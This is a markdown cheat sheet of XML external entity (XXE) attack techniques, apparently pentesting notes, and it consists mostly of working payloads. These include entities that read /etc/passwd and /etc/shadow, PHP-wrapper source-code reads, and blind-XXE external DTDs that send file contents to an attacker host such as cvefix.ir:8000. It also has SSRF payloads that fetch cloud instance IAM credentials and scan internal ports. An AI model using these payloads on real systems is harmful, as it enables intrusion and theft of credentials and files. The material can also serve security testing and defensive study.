# Detection
### XML Data Entry Points
- Search HTTP requests for tree-like structure or signature of XML document (`<?xml`)
- Keep an eye out for base64/URL-encoded XML data.
- File-upload features in _XML_, _HTML_, _DOCX_, _PPTX_, _XLSX_, _GPX_, _PDF_, _SVG_, and _RSS feeds_.
  - Metadata embedded within images like _GIF_, _PNG_, and _JPEG_ files are all based on XML.
- SOAP web services are also XML based.
- Force the application into parsing XML data in endpoints that take plaintext/JSON input by default.
  - Convert the JSON data to XML in *https://www.convertjson.com/json-to-xml.htm*
  - If neede, Change `Content-Type` header to `Content-Type: text/xml` or `Content-Type: application/xml`.
  - Include XML data in request body.
    - Replace `&` with `%26`.
    - Put the `%26data;` in a place that is reflected in the page source code.
    ```xml
    http://77.238.121.150:44791/flight.php?data=<!DOCTYPE f [<!ENTITY data SYSTEM "http://127.0.0.1/admin.php">]><flight><from>London, UK</from><depart>%26data;</depart><return></return></flight>
    ```
- Submit an XInclude test payload for applications that receive user-submitted data and embed it into an XML document on the server side.

### Normal XXE
- Send a few trial-and-error XXE payloads and observing the application’s response.
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
  
  <!ENTITY test SYSTEM "Hello!">                              <!-- Use one of these payloads -->
  <!ENTITY test SYSTEM "file:///etc/hostname">
  <!ENTITY test SYSTEM "/etc/hostname">
  <!ENTITY test PUBLIC "abc" "file:///etc/hostname">
  
  ]>
  <example>&test;</example>
  ```
  ```xml
  <!DOCTYPE f [<!ENTITY data SYSTEM "/etc/passwd">]><update><fname>&data;</fname><lname>&data;</lname><email>w@w.w</email><user>&data;</user><address></address></update>
  ```
- If these payloads work, try to read `/etc/hostname`, `/etc/passwd`, `~/.bash_history` (that contains URLs, IP addresses, and file locations)

### Blind XXE
- Malicious XML.
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
  <!ENTITY test SYSTEM "http://attacker_server:80/xxe_test.txt">
  ]>
  <example>&test;</example>
  ```
- Check VPS if the request is received. *(Use ports 80 and 443 to bypass common firewall restrictions)*

### XXE Payloads in Different File Types
##### SVG
- Open up the image as a text file.
  ```xml
  <svg width="500" height="500">
  <circle cx="50" cy="50" r="40" fill="blue" />
  </svg>
  ```
- Insert the XXE payload by adding a DTD directly into the file and referencing the external entity in the SVG image.
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
  <!ENTITY test SYSTEM "file:///etc/shadow">
  ]>
  <svg width="500" height="500">
  <circle cx="50" cy="50" r="40" fill="blue" />
  <text font-size="16" x="0" y="16">&test;</text>
  </svg>
  ```

##### docx, pptx, xlxs
- Unzip the document file.
  ```bash
  uznip 1.docx
  ```
- Insert payload into `/word/document.xml`, `/ppt/presentation.xml`, or `/xl/workbook.xml`:
  ```xml
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?><!DOCTYPE f [<!ENTITY data SYSTEM '/etc/passwd'>]>
  <w:document xmlns:wpc="http://schem....<w:r><w:t>ehsan&data;</w:t></w:r>....</w:sectPr></w:body></w:document>
  ```
- Repack the archives into the `.docx`, `.pptx`, or `.xlxs` format.
  ```bash
  zip -r new.docx *
  ```
- Upload the malicious document, then find an endpoint that show the parsed document.

### XInclude Attacks
- **XInclude** is a special XML feature that builds a separate XML document from a single XML tag named `xi:include`.
- Insert the following payload into the data entry point and see if the file that you requested gets sent back in the response body:
  ```xml
  <example xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/hostname"/>
  </example>
  ```

# Escalate
### Read file in normal XXE
- Place the local file’s path into the DTD of the parsed XML file.
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
  <!ENTITY file SYSTEM "file:///etc/shadow">
  ]>
  <example>&file;</example>
  ```

### Read Code
- Using PHP Wrappers
  - Maliciuos XML:
    ```xml
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
      <!ELEMENT foo ANY>
      <!ENTITY bar SYSTEM "php://filter/read=convert.base64-encode/resource=/root/php/test.php">
    ]>
    <owasp>
          <instagram>&bar;</instagram>
    </owasp>
    ```
- Using CDATA
  - `evil.dtd` file on attacker server:
    ```xml
    <!ENTITY all "%start;%stuff;%end;">
    ```
  - Malicious XML:
    ```xml
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
      <!ENTITY % start "<![CDATA[">
      <!ENTITY % stuff SYSTEM "/root/php/test.php">
      <!ENTITY % end "]]>">
      <!ENTITY % dtd SYSTEM "http://cvefix.ir:8000/evil.dtd">
      %dtd;
    ]>
    <owasp>
        <instagram>&all;</instagram>
    </owasp>
    ```

### Read file in Blind XXE
- In this scenario, we used only **parameter entities** and did not use **external entities** at all. Also this will exfiltrate just first line, because og `\n`.
- Host an external DTD (`xxe.dtd`) on attacker server:
  - `&#x25;` is `%`.
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/shadow">
  <!ENTITY % ent "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker_server/?%file;'>">        
  %ent;
  %exfiltrate;
  ```
- Malicious XML:
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
  <!ENTITY % xxe SYSTEM "http://attacker_server/xxe.dtd">
  %xxe;
  ]>
  ```

### Read file (with PHP Wrapper) in Blind XXE
- `evil.dtd` file on attacker server:
  ```xml
  <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/root/php/test.php">
  <!ENTITY % final "<!ENTITY exfil SYSTEM 'http://cvefix.ir:8000/?d=%data;'>">
  ```
- Maliciuos XML:
  ```xml
  <?xml version="1.0" ?>
    <!DOCTYPE r [
    <!ELEMENT r ANY >
    <!ENTITY % sp SYSTEM "http://cvefix.ir:8000/evil.dtd">
    %sp;
    %final;
  ]>

  <owasp>
  	<instagram>&exfil;</instagram>
  </owasp>
  ```
  
### SSRF
- Port scan
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
  <!ENTITY file SYSTEM "http://10.0.0.1:§80§">
  ]>
  <example>&file;</example>
  ```
- Pull instance metadata
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE example [
  <!ENTITY file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
  ]>
  <example>&file;</example>
  ```
- When trying to view unintended data like this, look for the exfiltrated data in page source code or HTTP response directly, rather than viewing the HTML page rendered by the browser.

